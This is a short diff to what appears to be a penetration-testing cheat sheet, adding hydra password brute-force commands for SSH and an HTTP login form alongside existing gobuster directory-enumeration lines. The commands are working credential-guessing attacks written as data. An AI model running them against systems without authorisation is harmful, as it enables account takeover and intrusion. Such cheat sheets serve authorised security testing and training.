@@ -28,6 +28,7 @@ Ffuf Directory Brute Force: (Fastest)
 
 Gobuster Directory Brute Force: (recommend first using common.txt wordlist)
 `gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -u http://$IP/`
+
 `gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -u http://$IP/`
 
 Gobuster VHOST Brute Force:
@@ -135,6 +136,10 @@ finger admin@$IP
 ## Brute Force
 
 FTP: `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 10.0.0.1 ftp`
+
+SSH: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1`
+
+HTTP FORM: `hydra -P "/usr/share/seclists/Passwords/darkweb2017-top10000.txt" "http-post-form://10.0.0.1/login.php:action=login&username=admin&password=^PASS^:Invalid Credentials" -l admin`
 
 # Reverse Shells or Shell access
 
